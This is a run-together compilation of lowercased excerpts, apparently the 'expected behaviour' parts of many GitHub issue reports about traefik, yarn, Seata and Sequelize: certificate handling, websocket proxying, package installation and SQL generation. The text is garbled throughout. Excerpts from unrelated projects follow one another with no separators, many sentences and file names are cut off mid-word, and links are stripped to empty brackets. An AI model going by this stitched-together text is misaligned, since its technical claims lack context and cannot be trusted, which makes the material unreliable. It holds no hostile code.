i expected the traefik to expose the backend service with the ip of the attached eni as it should with awsvpc networking enabled (similar to fargate)
a certificate is requested successfully for each docker container based on its host rule (docker compose labels: `traefik.frontend.rule=host:thing.ch10.nl`).
certs updated even in the case of transient errors with the configured dns server, or network issues like packet loss.
i used [this sslscan]( tool to check how "good" the tls config of my traefik server is performing
the result looks fine except for the following feature: ``` tls fallback scsv:
server does not support tls fallback scsv
``` scsv is described in [this rfc](
@nmengin pointed me to the list of supported tls ciphers in go (which is used by traefik)
they are available here: #pkg-constants
the list mentions the following option:
``` // tls_fallback_scsv isn't a standard cipher suite but an indicator // that the client is doing version fallback
see //
tls_fallback_scsv uint16 =
``` unfortunately it looks like traefik doesn't support this option at the moment.
i think this is an important security feature since attackers can attack certain ciphers more easily without this protection mechanism

tls connectivity to consul, and overall validation of the rest of the system per normal operation.
expected traefik to only route requests to tasks that are in running state
as i understand [`keeptrailingslash`]( #main-section) with it's default value of `false` requests with a trailing slash should be stripped of trailing slashes before being forward to the backend
if this is working as intended then the bug might be in the documentation :)
- traefik to work and reply with error when tried to access such a service
the numbers in the prometheus metrics should match the current activity.
i was expecting to see each of the `whoami` containers to exist under a single backend.
an authentication prompt.
i expect to retrieve the html page of the whoami container.
i expected traefik to ignore the fact that the backend is using a self-signed cert, and allow access to the service.
traefik should generate a cert
a working ingress, calm logs, and a traefik that responds timely to service/ingress changes.

traefik should proxy tailer headers correctly when grpc server returns error.

i expect traefik to **not** try to get acme certificates for the internal services.
i'd expect the acme challenge to succeed and let's encrypt to provide me a valid certificate.
i need to transition services from outside kubernetes to inside
i tried using service weights to canary test traffic into the cluster, but traefik seems to expect actual endpoints on the service
however, an [externalname]( #externalname) service doesn't have endpoints, but instead just routes traffic to the domain specified
i was surprised that these _didn't_ work with service weights, as traefik seems just fine to send traffic in all other instances where we are using externalname services.
traefik should check all tags, despite their order.

traefik retry requests when it received 502 responses from the backend with the `retryexpression` label and (hopefully) return successfully on the retry.
the main app is scaled to `0` instances, thus there no backend available to handle requests
i'd expect traefik to handle request with the error handling backend: `backend-api-json-errors`.
the traefik user-agent not being a dominant source of malformed errors in our logs :-)
i expected to see traefik not loading only the broken configs and still maintaining the good ones loaded.
both client and server should receive both message sizes without delay.
a proxy websocket server work like the source server.
- get requests to this ingress should go through as long as the request body is less than 8b.
- get requests to this ingress should be rejected if request body is greater than 8b.

traefik should either 1) handle quotes properly or 2) warn/error on second ingress and ignore that, yet handle and support subsequent ingresses.
traefik 1.7 is behaving similar to version 1.6 and serving api on port 8080 with tls: ```

we need to figure out why consul is throwing 500s, but we're very concerned with the fact that traefik doesn't seem to gracefully recover
i guess i'd expect traefik to go into a retrying state.

i expected to only see certificate generation for **test1.my-domain.pro** but not for **stack-test2.my-domain.pro**.
when i upgrade a service when the new containers come up they should join the backend in traefik.
and i should be able to leave the old container there in case i need to rollback.
expect to see a single set of dns challenges being run.
expect traefik to close socket connections when the timeouts and maxidleconnection limits are reached.

mutual tls authentication between traefik and remote backends
i'm using traefik as api gw for multiple remote api servers
i do not want to pass client certificates (used for frontends) to the backends
i'm expecting traefik to use certificates stored into kubernetes secrets to autenticate against remote api servers.
as you surely now, wildcard certificates covers `domain.tld` and `*.domain.tld`, but not `*.*.domain.tld`
so i was expecting the wildcard to be used for and but not for
i was expecting a let's encrypt certificate to be generated for this domain.

some apps (like nextcloud sync client) isn't working good with traefik reverse proxy.
why is traefik reverse proxy not transparent and not the same working with or without it? because if i try my nextcloud image without traefik then it works well

response from backend - http 200 success
traefik to send all requests with url starting with `/v1/my-subpath/products` to my backend and rewrite path: - `v1/my-subpath/products` -> `/api/v1/products` - `v1/my-subpath/products/` -> `/api/v1/products/` - `v1/my-subpath/products/100` -> `/api/v1/products/100`
`x-forwarded-host` to be the real one from the original `host` header.
no errors as the new app was ready behind alb2.

the request is proxied through to the backend, and the backend's response is forwarded to the client as normal.
for each supported config parameter
what does it do?
where can it appear? eg
static configuration, dynamic configuration
what are the valid set of values and how are they interpreted? maybe something like these directive guides:
i know traefik's configuration structure is more hierarchical so may need a slightly different approach, but the important thing is that it's centralised, consistent and comprehensive.
`frontend-specific` takes priority, due to negative priority on `frontend-fallback`.
i expect traefik to throw an error indicating the configuration could not be loaded.
correct redirection from http to https
i expected traefik to use the wildcard certificates in both scenarios, when doing the requests.

successful acme client operation
the page load successfully.
we expect to see multiple tasks belonging to different marathon apps within the same backend.
no cpu spikes (e.g
like general load balancers / reverse proxies)
i would expect to see some kind of lock management mechanism in the code that periodically checks for stale locks in order to enable a replacement pod to remove it and take over the acme client functionality.
if the connection failed for some reason i would expect the traefik pod that has the acme lock in the backend kv store, kubernetes etcd in my case, to retry after some configurable time interval.
now when requesting an unconfigured subdomain like `foo` i'm expecting traefik to not hit letsencrypt for that domain

an ```apt-get update``` should iterate through each provider and collect package information.
to see all the services inside the dashboard.
a reverse proxy fetching certificates from letsencrypt and serving https traffic.
a route to `samplename.sampledomain`.
concourse gets events from the backend.
traefik reloading the service with a new port
a single curl on nginx1 generates 1 line in the access log: ```
172.17.0.1 - - [13/dec/2017:19:49:27 +0000] "get / http/1.1" 200 612 - "curl/7.54.0" 34 "host-nginx1-test-tld-3" " " 0ms
``` a single curl on nginx2 generates 1 line in the access log: ```

expected to get a certificate generated and served.
traefik should pick up consul changes very quickly
traefik configured and running against zookeeper.
i expected security headers cors work for 404 and 502 error page.
or something similar to override it for error pages
when i initially ran `storeconfig` the acme/storagefile key should have never been created in the first place
the host ip in the backend url.
i expected the same behaviour as the docker backend where it will automatically expose containers based on their exposed port if there is only one.
traefik starting up without issues, with https redirect on for the docker backend, and no redirect for consul backend.
backends configured for appropriate frontends
ok:
the headers must be separated by a neutral separator.
not so much logs, as it creates a lots of noise
again, this may be work as expected, that's why i said is it a _possible_ bug.
a default nginx html page accessible on port 80.
traefik serving traffic and registering the docker backend.
stats populated for `totalrequestcount` etc
traefik retrieves a correct configuration from docker and only sees one instance of my service.
traefik should forget the old virtualips and find the virtualips of the last provisioned container.
less memory usage
/ what did you see instead? when i'm hitting the echo service: ```console
$ curl
{ "url": " ", "protocol": "http", "host": "foo.bar.baz", "path": "/", "method": "get", "headers": { "host": "foo.bar.baz", "user-agent": "curl/7.43.0", "accept": "*/*", "x-forwarded-for": "10.91.62.52", "x-forwarded-host": "foo.bar.baz", "x-forwarded-port": "80", "x-forwarded-proto": "http", "x-forwarded-server": "internal-ingress-tcp-proxy-8495446487-m6nw6", "x-real-ip": "10.91.62.52", "accept-encoding": "gzip" }, "query": {}, "body": {}
``` i understand that `x-forwarded-proto` reads `http`, [since traffic hitting traefik is not encrypted]( #l37) but i can't see where port `80` comes from
i don't use port 80 anywhere in this setup and i haven't found any place in the code where it would default to `80`
i can only assume that it's set to 80 because the url reads ` `, which is inaccurate
so instead, i was expecting to see:
url:
x-forwarded-port: 443
``` running `tcpdump` inside the traefik container, i can see the proxyproto header:
proxy tcp4 10.91.62.52 10.66.23.101 49614 443
the original request hitting traefik,
``` 10.2.10.0.39195 > 10.2.7.183.443: flags [p.], cksum (correct), seq 2569673526:2569673621, ack 642188022, win 106, options [nop,nop,ts val 3304917303 ecr 3082179752], length 95

traefik should update its config based on the updated consul tags
i expected to see information in /health
`trustedips` inside `entrypoints.http.forwardedheaders` should allow the ips in the list to be trusted to send `x-forwarded-*` http headers.
the backends for traefik frontends should automatically update when new versions are deployed and registered in consul.
the `302 found` response code.
in case of basic authentication defined on two frontends using the same backend: ```console
$ http localhost/secure
http/1.1 401 unauthorized ```
$ http localhost/hello
http/1.1 200 ok
before performing the change i've noticed that traefik started 20 threads
i was expecting the number to be at least twice as low after the change.
i should be seeing the web ui of the backend services running with appropriate traefik labels via the docker swarm mode backend.
make test-unit pass
i expected to see the websites running behind traefik since those containers are still up and traefik had the configuration for the containers before the rancher server went down.
websocket should work with and without tls enabled in the backend.
1) if healtcheck is disabled and service is updating/updated, i see service rule on the traefik web admin
and servise opend in browser
2) if healtcheck is enabled
i want to see the same behavior at this point.
traefik healthcheck should work if `--web.path` is given as parameter, but it doesn't.
when i calling the `/traefik/ping` url with curl, it works.
traefik to reboot and serve content as usual
traefik should forward the individual response messages as they are sent
sticky session cookie name.
the auth-realm should either be used, or ignored with a warning.
traefik waits for consul cluster to start and then polls the catalogue.
working wss:// endpoint with ws:// backend
with passing http basic credentials.
new services present in traefik
stable state and no unnecessary acme certificate reissuance attempts
traefik would poll consul on specified url and retry if consul hadn't started yet
this was working previously with v1.3.5 of traefik.
get 1 frontend with 2+ backends
traefik have to detect a lost backend or to switch to another available backend if the current don't respond within 5 seconds (by exampel) or if traefik can't open connection on it.
every container, from each stack, with its own "host name rule" for frontend, and its own backend, as seen below, when traefik is using rancher.api ![screen shot 2017-09-18 at 1 13 33 pm](
all node.js web instances to be on the admin panel, and that all node.js web instances 'traefik.alias.fqdn' is properly routed
expected to get correct value for `passhostheader` setting (equal to false)
all my rancher stacks working normally, as was before the upgrade.
traefik should use the specified port to check healthcheck of the backends
i expect traefik could load configure from etcd corretly, and foward my request.
i expect update frontends and backends without restart traefik.
successfully established traefik.
a `-` if `originstatus` and `origincontentsize` are not set.
the browser sends the following request to traefik:
/lool/https%3a%2f%2f${host}%2fapps%2frichdocuments%2fwopi%2ffiles%2f${fileid}%3faccess_token%3d${token}%26access_token_ttl%3d0%26permission%3dedit/ws
``` this uri needs to be received by nginx and in turn by collabora to work correctly.
when accessing ` `, i wanted it to redirect to ` `.
i would expect the wss link to be forwarded properly to the backend, either by wss or https, the backend supports both on the same port.
update from v1.2.3 to any higher version should work
`x-forwarded-port` should be equals to 443
i've expected traefik would detect frontend and backend.
let's encrypt certificate renewed
the configuration of traefik stored on the key/value store.

page loading normally and updating via push.
cannot find a configuration for ssl termination of websockets
`sec-websocket-protocol` should be forwarded to the backend and then back to the client
http 201 response
using socket.io the client is able to connect directly without traefik
client --> (ws-http) --> server but fails client --> traefik(wss-https) --> (ws-http) --> server
one of two things, i am not sure which is desirable:
- a warning/error in the logs that the configuration is invalid
- a properly working/routing traefik instance
connection to succeed
i expected the performance to remain the same .
websockets upgrade to return 101
no matter which entrypoint i hit, i expect the "broken" server to be excluded.
**correct response example without retry**
http/1.1 200 ok
content-type: text/event-stream;charset=utf-8
transfer-encoding: chunked`
websockets pass through successfully for app to work
each frontend having its own backend, like when using integration via rancher api, even though every backend container is named 'plone'
traefik 1.3 configured with rancher api creates several backends based on the stack name, like "backend-site1-plone", "backend-site2-plone", etc.
my multiples traefik services registered
websocket handshake succeeded => 101 switching protocols
traeffik processing k8s ingress rules
our current k8s yaml files used to work until last week to deploy traeffik as k8s ingress controller
a graph with numbers which is readable
the externalname url is being requested on the mapped target port.
the site should work immediately after deploy.
the http request will be routed to the service as the old version.
i expected to see traefik to start
all replicas to be working
not only 2 of them.
traefik humming along nice and smooth.
traefik running fine without complaints.
whoami should report a request to the `/foo` path.
access portainer normally
it worked with traefik:1.2.3
correct recording of http requests / http request durations metrics with the `service` label set to `backend1`.
since stickiness is configured, and since a single, global path was specified, all requests from a given client browser session should be directed to the same app pod.
marathon provider working
traefik redirecting all requests from to
https access to my services authenticated
http redirect to the https equivalent
end-to-end http transactions will work fine via traefik load balancer.
traefik continuing to work with previous configuration, serving clients normally.
whole traefik.toml uploaded to consul
i expect traefik to serve both `testapp.example.domain.com` and `multi.example.domain.com` domains with usage of given static wildcard crt, and `subdomain.multi.example.domain.com` with a use of aforementioned generated acme crt
no errors and if i went to `hostname.com` it would turn that in to `hostname.com/notes`
i expected that it would be enough if traefik has the rights to access ingresses from the respective namespaces.
i expect to see traefik working
i expected it to work as usual
working traefik proxying portainer.
traefik should complete the acme request without any problems.
working traefik :)
i expect the content to be compressed only if it isn't already compressed (as indicated by the backend).
the process start with no errors.
that the other acme parameters would be ignored
ip address in backend
changes apply on the right files.
the service name or the ip addresses of all the tasks (containers) created should be registered on the backend's url.

an acme lets encrypt certificate obtained and served ondemand.
traefik reverse proxying the request to internal proxy which makes the request to weechat relay.

the behaviour should be the same when accessing using the routes: - elb 443 -> traefik 443 -> nginx 80 -> registry 5000
- elb 443 -> nginx 443 -> registry 5000
no stopped and removed containers should still have frontend and backend configuration
i my case just some stopped and removed containers are left.
it shouldn't matter what form it takes
#### `-pz` should behave identically to `-p -z`.
test should succeed.
i would expect an output of `2` and generally the result of `--count-matches` to be equal to or greater than that of `--count`.
yarn resolutuons are respected

i am definitely not developing the installed dependencies, but i want my own devdependencies to be installed
so i think this way is more convenient (in my opinion) - `yarn install` should install own devdependencies but not devdependencies of dependencies.
- `yarn install --prod` should not install both own devdependencies and devdependencies of dependencies.
- `yarn install --some-option` acts similar to `yarn install` but including devdependencies of dependencies (for somebody with their own edge cases)

> if you don't plan to publish your package, the name and version fields are optional
private packages with no version field in package.json is not uncommon specially in non-library packages like applications and webservers as they mostly have other means of shipping the code e.g
ignoring these packages only makes yarn workspaces useful for library-only monorepos
so i propose we stop ignoring these packages during dependency installation (successfully install and link their dependencies) and throw an error only if another package in the workspace depends on them

i would expect i don't have to delete the `yarn.lock` when certain sub dependencies change

this appears to be a problem with npm in general ( so i'm not sure whether it should be addressed in yarn, or just documented, as it's pretty confusing behaviour and the documentation around what happens with scoped packages is lacking in general
looking at the code of [`cli/commants/create.js`]( though, it appears that it used to read the package.json and run the bin script directly, though this seems to [have been since removed]( #diff-c7b21e678f3577b9dfd0a953fb89033a) due to issues with windows compatibility
an alternative solution may be to allow package authors to specify custom script names via `bin` (e.g
`"bin": {"custom-script-name": "./myscript.js"}`), then either allow that name to be specified elsewhere in the package.json, or if there is only one bin script present, use that

first of all i would like it if the `--json` flag didn't just spam multiple random json entries and instead printed everything in one single json
secondly i would like it if `--prod` flag actually worked
not sure what it's suppose to do but you still see devdependencies
secondly i would like the following other options: - date of current, wanted and latest - size of current, wanted and latest - show child dependencies (doesn't matter how it's serialized, but parent should be made clear) - some sort of integration with vulnerability scans would be convenient (with flag to turn it off for anyone who already uses another solution for that) it's fine if these are all behind flags
the reason for the date is because currently you can have a package that never got updated ever and is 6 years old, but is marked green
maybe it really is that simple and never required upgrading, maybe it's just a bad package
with how fast things change in nodejs land (and deprecation in apis like buffer) i kind of doubt the former
it also helps in that you can make some fair judgement calls, such as "<6 months = probably still on \'supported\' list" and will get critical security fixes
the size is two parts
first it related to the first point, if you can see the size you can make some judgements on how likely an very old package is to truly not be in need of upgrading just based on the size (and more importantly you can do this programatically)
secondly, you can spot bloat problems
some dependencies are intended for frontends, even if the author didn't consider the use case, so if for whatever reason they decide to bloat it up (eg
momentjs and timezones) "latest" is definitely not something you want to upgrade to (you may even wish to change it entirely)
showing child dependencies (and it's important to know what the parent is) helps in situations where everything is on the latest, and is not very old, but has some very undesirable dependencies
*the dependency of my dependency is my dependency.* it's also important in deciding how big the priority is to upgrade to a newer version, eg
maybe that bugfix release on it is actually some really major dependency changes.

i expect the offline-cache to contain two tgz archives containing the internal github packages

**please mention your node.js, yarn and operating system version.**

unlike #4266 and #4324, this problem disappears in later version where scoped packages are used (e.g

with yarn 1.0.2 i do not get this error

run apt-get update && apt-get install -y npm && npm install -g yarn@1.2.1
run git clone --depth 1 && \\ cd theia && \\ yarn
expose 3000
workdir /home/theia/theia/examples/browser
cmd yarn run start ``` you will see the error while doing a `docker build -t theia .`
i suppose i should get the package.
after i set up the repository and a 4xx error is returned, i expect a cli query asking for my username, email and password (drop the username and email when those are already entered in `~/.yarnrc`) **more descriptive stuff** okay, we have an artifactory server which serves as both, a proxy and a private repository container.
there is no anonymous access to the server so even read access is bound to a proper log in
i started from scratch with no pre existing .npmrc.
i created my `~/.yarnrc` by doing this:
`yarn config set registry `
`yarn config set always-auth true`
`yarn config set strict-ssl true`
`yarn config set cafile /path/to/root/cert`
after this set up i invoked `yarn login` and entered my username and email
publishing a package is no problem since i'm asked for my password here.
the workflow for the publishing seems to be
* query for version
* query for password
* create a token with http put to artifactory
* use? this token to publish my package
* delete the token from artifactory with http delete after this, i'm left as i started - without a token since it was deleted (and it was probably in the ram anyway)
when i then invoke `yarn add` to add my private package, i'm not queried for my password which results is a 403 (forbidden)
yarn doesn't evaluate this issue and merely reports it back to me
i didn't find a way to set a proper auth token
i played a bit with postman and was able to create a valid token for myself but not sure how i'd use it after this (maybe there is a hidden cli flag?)
this seems to be the wrong way anyway
manually grabbing a token to make the package manager work sounds counter intuitive to me
looking into other threads didn't help either
most "solutions" seem to be work arounds.
the only solution that *seemed* to work was to put my plain credentials into the `~/.npmrc` and work with that
but that only worked for a direct private package with no private packages as dependencies there
i suppose the credentials are stripped from the url after the first iteration
this also happened another day while testing with a second `~/.npmrc` i guess i'll try to add the token i created with postman in the `~/.npmrc` manner and add it like //my_registry:token anyway, i hope this is any helpful and maybe someone can help me out.
cheers edit: adding the token to the `~/.yarnrc` didn't help either.
urls would be visible

``` # background research
the problem was previously noted in:
this yielded a fix that tried to autodetect mintty and use winpty:
that fix worked for interactive operations but breaks any sort of piping
this fix was removed in favor a explicit environment variable in:
the reason being yarn shell commands seemed to fail because of winpty when used in a pipe
and there appears to be some terminal output that shows git bash working without the need for `winpty`
this is not consistent with my experience
# technical details
i believe yarn uses `istty` to check for an interactive terminal
the discussion attributed the issue to be caused by `winpty` however running node by itself can produce that error:
$ node -p -e "boolean(process.stdout.istty)"
true $ node -p -e "boolean(process.stdout.istty)" | cat
stdout is not a tty
``` i think that's the check that's actually causing the issue when any yarn command is involved in a pipe
but weirdly using `yarn` in a pipe works for commands that are not interactive like `--version`
below is a bunch of commands i ran on the terminal that i hope help diagnose the issue
$ yarn --version | cat
1.0.2 $ yarn init
yarn init v1.0.2
error an unexpected error occurred: "can\'t answer a question unless a user tty".

``` there's a lot of moving pieces so its hard for me to understand the cause and effect here
so i'm not sure of a good solution that keeps this interactive terminal check
my initial thought is that this check for interactive terminal isn't really worth the hassle of keeping around
if you design a script that has `yarn init` and fail to provide input or redirect properly and it spins forever waiting that should be on you right? npm doesn't do this and i suspect its because of these kinds of problems
it would seem that i have to use the `yarn_force_winpty` when using an interactive command in git bash and specifically _not_ use that when trying to do any piping
further, `yarn_force_winpty` isn't documented anywhere as far as i know
other than the old issues and the script itself
maybe add that to the error message? regardless of all that i just want to be able to type `yarn init` and have it work consistently without having to do anything special to make it work on windows.

`postcss#caniuse-api/features.js` is listed in `.yarn-integrity`
if i remember correctly, yarn currently generates `.yarn-integirty` via a list of install artifacts, but also does a file crawl for other integrity purposes
this can probably be fixed by either using a crawl (ideally piggybacking on any existing crawl) to generate the artifacts and/or ensuring the audit step runs **after** the postinstall script phase

at the point where the new git process is spawned, the problem is handled correctly and a useful error is generated:
#l53-l59 later in `remoteexists()` this information is lost and all errors are treated as "remote doesn\'t exist":
#l108-l115 then for any such "not existing" remote the "refusing to download" message is generated

os ubuntu 16.04 seems this was introduced sometime between v0.24.5 and v0.27.5
we were using this behavior as part of a docker build script that would internally grab an npm authorization token (from `yarn config`) to provide it to the docker container being built
would be nice to see the regression fixed, to bring this back into line with npm's behavior.
yarn defaults to `$home/.npmrc` as [documented by npm]( #per-user-config-file)

yarn should link and install unhoisted deps for the workspaces **further thinking**
this issue also happens not only when the node_modules was cached, but if for some reason i've delete packages dir and checkedin it again from git and similar scenarios **immediate workaround**
delete the top level `node_module` dir/disable ci `node_module` cache
but not yarn cache!
for my project `yarn install` is very quick so i can live with that for now **please mention your node.js, yarn and operating system version.**

i don't know where you really want to put the global modules
however, since "c:\\users\\<user>\\appdata\\local\\yarn\\bin" is appended to the user\'s path environment variable i would suppose this is the right folder
strangely enough, since "yarn config get prefix" yields "undefined", i tried "yarn config set prefix "c:\\users\\<user>\\appdata\\local\\yarn\\bin"" (which obviously is the above listed global bin)
then global modules are indeed installed there

my expectation is that yarn pruning should remove all non-current _tarballs_ (i.e
`*.tgz` files?) that aren't current, but leave my `.git` file alone
my expectation is fuelled by [pruning an offline mirror | yarn]( that describes that:
> however, it does not automatically remove tarballs that are no longer referenced in yarn.lock
for example, if you $ yarn remove a dependency, the tarball will remain in the mirror, even if no other dependencies have it as a sub-dependency
this behavior can be desirable in a setting where many projects share the same mirror, but when that is not the case, you may want to have yarn remove unnecessary tarballs
so this isn't life and death
the workaround for us is to put all the tarballs in a `cache/` sub-directory, and let yarn prune there instead
but this extra directory is a little ugly
thanks for giving us yarn-offline-mirror-pruning to begin with! **please mention your node.js, yarn and operating system version.**

i suggest supporting copy for people hitting this bug, copy that suggests that this is a bug that's being considered for resolution with the `yarn publish` command
going further, as a kind of stretch goal, there could be a link to a workaround that verifiably works by the yarn maintainers or community
considering this issue has existed for people for about 6 months, it would be really valuable to communicate this issue sooner than later while it still exists
**please mention your node.js, yarn and operating system version.**
node: v7.7.4
yarn: 0.21.3
after not receiving a new version from the user, yarn should print an info message to the effect of "proceeding with current version: x.y.z"
alternatively, remove the `yarn version` behavior from `yarn publish` altogether and let it just be responsible for publishing
**please mention your node.js, yarn and operating system version.**
node -> 7.7.3
yarn -> 0.21.3
os -> macos sierra 10.12.3 part of the issue here is the [`yarn publish` docs]( don't mention anything about modifying the version
the unsuspecting user is thrown into a prompt for a new version when all that is expected is to publish the current state of the package without additional side effects
including the behavior of `yarn version` in `yarn publish` might be a convenient shortcut for some
but in its present undocumented state, it is unexpected and confusing
seeing as `yarn publish` invokes the same `setversion()` function as `yarn version`, it may make sense to delegate the responsibility of bumping the package version to `yarn version` and allow `yarn publish` to just publish
if the above is not practical for some reason, at the very least it may be helpful to print an info message when the user does not specify a new version telling them the current version will be used
furthermore, it may also be helpful to explicitly state (as a message in the console or in the docs) that `yarn publish` will not create a commit or tag if no new version is provided.
- the package that yarn upgrades b to should be the new upstream version from the git url, not the yarn registry

it works successfully either by using 'npm install' in git bash, or by using the default windows 'cmd' shell with yarn.
it feels like there's some os-specific path separator escaping going on, rather than treating the package name purely as a string

i think we need to move the version check to the very top of `yarn.js` before any of our `require` statements are executed, so that it can exit as soon as possible when an outdated/legacy node.js version is used.
either yarn should warn me that it cannot link the binary to /usr/bin or at least there should be, like before, a `.bin` directory inside `~/.config/yarn/global/node_modules`

``` actually this is what happens after a `yarn upgrade`
but sounds weird the need of this correction, right? i am inferring that a `yarn upgrade-interactive` should lead to a **deterministic** `yarn.lock`

the already installed version of webpack should have sufficiently meet the peerdep requirement without installing an additional copy
this kind of duplication for peerdependencies not only wastes time/resources but also causes fatal issues - in this case the webpack build will fail if the plugin is loaded
interestingly, if no webpack is installed prior to installation of the html-webpack-plugin (with peerdep on webpack), the `yarn add` will still succeed, installing the webpack automatically, but the webpack version is hoisted to the top level
in many cases this is actually desirable, but it's not how npm works

this might be a good thing because we might be able to force people to do it the "correct" way, but @kittens added support for writing engines like this in however, it might be better to not display these warnings since so many packages do it and we already technically support it.

node 6.6.0, os x 10.11.6 notes: you can find the side effects of this error under [`package-hoister.js`
on line 150]( #l150)
when it runs through this.dependencies, with the example repo mentioned above, it's detecting an extra dependency of `inherits@2` (along with the correct inherits@2.0.1)
i guessing this is actually originating somewhere during the normalizing process, and it's not properly cleaning up this dependency before getting passed to the flatten
i'm not sure how node is handling this since my understanding is that they also flatten the dependencies, but i'm still looking into it
in the meantime, i've opened an issue on the `semver` package [here]( to see if this is intentional or will be added, to determine whether or not the fix should be a responsibility of this repo.
running `yarn install --flat` should prompt you for resolutions and finish the install properly
if you need a test case i was trying this out with
roup-instance.xml

when dbtype is oracle, the sql returned by the method should change "limit ?" to "rownum <= ?" and put it in where clause to support oracle.

in my point, i think that a global forupade should acquire the global row lock, then executes query sql, then release global lock
like this, we can avoid a dirty reading
this solution can resolve this problem
wish seata global forupdate perform as same as single transactional in read committed isolation level
best wish!!

user can design ip address in arguments when server start
no matter how , biz sql should not be repeatedly executed when retrying.
after that, when rm failed to register branch transaction due to globl lock conflict, the local transaction should be rollbacked to release transaction resources before retrying.
after exiting method transactionaltemplate#execute, any threadlocal variables of the global transaction which are newly created by this method call should be cleared
just like spring jdbc, the outside transaction aop method should clean up the resources that it created.
if fescar support update clause without where condition, then this bug should be fixed.

i would expect the original constraint to remain, or prefer the old behavior of constraints being removed and needing to be re-added
new behavior is a breaking change.
i expected the hook to be called.
`type` should be excluded.
here is a query generated when `minifyaliases = false`: ```sql
select "id", end_date - interval \'1 month\' * coalesce(notice_period,0) as "cancellation_date" from "users" as "user" order by cancellation_date;
the column should be dropped on sync
alter table "users" drop column "searchfilter";
i expect `f2` to be the same instance (or at least have the same values) as `f1`, as an upsert with `returning: true` should bring back the created/updated record.
_the options object should not have been modified._
there should not be any duplication in the generated sql query.
i was expecting sequelize to use the default scope when using `reload`.
i would like to be able to update the `updatedat` manually.

console.log(results[0].id);
console.log(results[0].primarykey);
// db autoincrement id
noting in error log;
when `groupby = []`, i would expect `sequelize` to produce the sql query below ```sql select ..
from `model` as `model`
the returned data to be in sqlresult[0]
i wanted the data inserted as a new row in the table
_have all logs messages logged through my sync logging hook!_
i expected both player to be returned
the expected output was:
[ 'franchesko totti', 'mohamed salah' ]
the expected query that should be used was:
select `players`.`id`, `players`.`name`, `players`.`teamid`, `team`.`id` as `team.id`, `team`.`name` as `team.name` from `players` as `players` left outer join `teams` as `team` on `players`.`teamid` = `team`.`id`;
as described in [this answer]( sql-functions within the default constraint must be enclosed by parentheses
if they are added to the output below, the query completes successfully.
(running `insert into foos () values ();` shows the constraint is working)
i expected the resulting sql query to be ```sql select count(*) as `count` from `foo` as `foo`;
the field actualid should return the auto-incrementing integer value.
this scenario only happens on the mssql dialect
the sql insert commands generated for mssql dialect should be the same as the mysql dialect but are not.
_nested subscription on product to be updated._
i expected the resulting sql query to be ```sql select `id` from `listing` as `listing` where `listing`.`foo` like '%bar%'
there should be a number
i expected to generate the correct answer with ```sql
insert into `articles` (`id`,`product_type`,`purpose`,`pv`,`uv`,`is_deleted`) values (1,'0','0','0',uv+1,'0') on duplicate key update `uv`= uv +1
i would expect sequelize to throw a sequelizevalidationerror or any other error that fits better on this situation.
the update should succeed.

working query.
for the value '43069.0122916667', it ended up written '6175.5241442476'

i expect "avg_score" to be a number ( as [it meets number validation rules]( #number) ) on "metrics": { "votes": 42, "avg_score": 3.5 }
the generated sql query should only contain column `role` in table `participations`.
i would expect no error to be thrown on a successful delete.
i want filter based studentmodel specialties (character varying[] datatype)

i expected that to work and update the row.
in the sscce i run the same setup code twice but with different memory databases
i expect both runs to produce the same sql statements (`insert into useringroups ....` is missing in the second run), so the second run should create a association between my `user` and `group` and print: ```
"usergroups" [ "usergroup"
i expect the record to get created and log `it worked!`.
post output should be: { id: 5, title: "foo", body: "bar", author: { profile: { id: 1, firstname: "john", lastname: "doe", email: "john.doe@sequelize.com" } }
it should created a table with fields
i expected sequelize to not try and create duplicates, using either `insert ignore` (mysql), `upsert`, etc
in the given use case, the relationship between a `product` and a `productlocation` is through `productstock`; there can be many `product`s and `productlocatios`s, such as there can be many "pencils" at many "workstations"
many of the same "pencils" may be found at the various "workstations", thus the **n:m** relationship
unfortunately, when saving a product specifying the locations (and quantity), it tries to create the `productlocation` instead of creating, updating, or deleting the various associations
+-----------+ +----------------+ |-------------+
| product | | productstock | | location |
+-----------+ <---> +----------------+ <---> +-------------+
| id | | productid | | id |
| name | | locationid | | name |

+-----------+ +----------------+ +-------------+ { id: 123, name: "pencil", ..
productlocations: [{ id: 55, name: "workstation1", ..
productstock: { productid: 123, locationid: 55, qty: 2 } }, { id: 56, name: "workstation2", ..

productstock: { productid: 123, locationid: 56, qty: 25 } }]
i would expect the code not the fail with the exception, but rather to provide the data
the query executed against the db in version 5.18.3 was: ```sql
select [channel].*, [tracks].[id] as [tracks.id], [tracks].[token] as [tracks.token], [tracks].[channelid] as [tracks.channelid] from (select [channel].[id] as [id], [channel].[token] as [token] from [channel] as [channel] where [channel].[token] = n'audinovinky' order by [channel].[id] offset 0 rows fetch next 1 rows only) as [channel] left outer join [track] as [tracks] on [channel].[id] = [tracks].[channelid]; ``` or actually formatted to make it bit more readable: ```sql
select [channel].*, [tracks].[id] as [tracks.id], [tracks].[token] as [tracks.token], [tracks].[channelid] as [tracks.channelid]
from (select [channel].[id] as [id], [channel].[token] as [token] from [channel] as [channel] where [channel].[token] = n'audinovinky' order by [channel].[id] offset 0 rows fetch next 1 rows only) as [channel]
left outer join [track] as [tracks] on [channel].[id] = [tracks].[channelid];
model sync success and mysql create table with foreign key.
_both finds unit where building_id_ ```
// select * from unit where building_id = 123
// select * from onother_entity inner join unit on ...
and building_id = 123
a response like: on
{ "title": "category z", "slug": "cat-z", "file": { "url": "..." }
i would expect a row to return if (based on the example sscce provided, either author.name or author.nickname or reader.username matches the query term
i expected to be able to access `derivedname` on the `user` model associated with each `foo`
this required `name` to be fetched and available to read in the model.
i expect virtual fields to be populated with the actual data
a user without projects.
in the case i have srid in the geometry column of the db record i expect to retrieve it with srid information: const geomobj = await testgeom.findone() console.log(geomobj.geom)
executing (default): select "id", "geom" from "public"."test_geom" as "testgeom" limit 1;
{ type:'point', crs:{ type: 'name', properties: { name: 'epsg:4326'} }, coordinates: [30,60] }
and updating the record with this geometry does not lose srid info:
![ ](
see the sscce, `ship.getcaptains()` should return something
the second query in `t1` will wait for `t2`, and the second query of `t2` will result in a deadlock
after this, `t2` should be rolled back, so we should have one available connection to start `t3`.
see the expected assertions from my sscce: // *** the below is what should have been expected *** // reload the modified original `bar` object by `id` const refreshedoriginalbar = await bar.findbypk(originalbar.id); // the value should have been updated expect(refreshedoriginalbar.value).to.equal("modified"); // the refreshed updatedat should be greater than the original updatedat expect(refreshedoriginalbar.updatedat > originalbar.updatedat).be.true;
``` i wanted a duplicate to be detected by the `unique_timestamp_per_foo` unique key when calling the `bulkcreate` method with `updateonduplicate` array set
furthermore, i wanted the insert sql to be `on conflict ("timestamp", "fooid")` instead of `on conflict ("id")`
